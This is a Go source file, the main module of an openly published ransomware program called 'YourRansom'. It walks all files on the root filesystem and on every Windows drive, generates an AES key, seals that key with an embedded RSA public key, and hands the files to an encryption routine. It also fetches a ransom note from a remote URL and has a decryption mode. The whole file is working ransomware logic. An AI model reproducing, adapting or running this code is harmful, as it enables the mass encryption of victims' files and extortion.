//    YourRansom
//    Copyright (C) 2016 boboliu

//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.

//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.

//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

//    You also need to use it under [DO NOT BE EVIL] ADDITIONAL LICENSE, There
//    is a copy of [DO NOT BE EVIL] ADDITIONAL LICENSE with this program in git
//    repo.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
)

const procNum = 10

var method byte

func do_cAll(path string, list chan string) error {

	if filter(path) == 0 {
		return nil
	}

	dir, err := os.Stat(path)
	if err != nil {
		return err
	}

	if !dir.IsDir() {
		if method == 'e' && filter(path) == 2 {
			return nil
		}
		list <- path
		return nil
	}

	fd, err := os.Open(path)
	if err != nil {
		return err
	}

	names, err1 := fd.Readdirnames(100)
	if len(names) == 0 || err1 != nil {
		return nil
	}

	for _, name := range names {
		do_cAll(path+string(os.PathSeparator)+name, list)
	}
	return nil
}

func cAll(list chan string) {

	defer func() {
		if method == 'e' {
			downloadReadme()
		}
	}()

	if runtime.GOOS != "windows" {
		do_cAll("/", list)
	}

	DriverChan := make(chan bool, 26)
	for i := 0; i < 26; i++ {
		go func(path string, list chan string, ExitChan chan bool) {
			do_cAll(path, list)
			ExitChan <- true
		}(string('A'+i)+":\\", list, DriverChan)
	}
	for i := 0; i < 26; i++ {
		<-DriverChan
	}

	close(list)

	return
}

func saveKey(cip []byte) {
	keyFile, _ := os.Create(keyFilename)
	block, _ := pem.Decode(pubKey)
	pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)
	pub := pubI.(*rsa.PublicKey)
	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)
	keyFile.WriteAt(word, 0)
	return
}

func downloadReadme() {
	res, err := http.Get(readmeUrl)
	if err != nil {
		ioutil.WriteFile(readmeFilename, readme, 0)
		return
	}
	defer res.Body.Close()
	data, _ := ioutil.ReadAll(res.Body)
	ioutil.WriteFile(readmeNetFilename, data, 0)
	return
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Println(string(alert))
	action := true
	handleList := make(chan string, 2048)
	bb, err := ioutil.ReadFile(dkeyFilename)
	if err != nil {
		action = false
	}
	b := make([]byte, 32)
	var cip cipher.Block
	if !action {
		rand.Read(b)
		cip, _ = aes.NewCipher(b)
		saveKey(b)
		method = 'e'
	} else {
		cip, _ = aes.NewCipher(bb)
		fmt.Println("Your files are decrypting...")
		method = 'd'
	}
	go cAll(handleList)
	startHandler(cip, handleList)
}
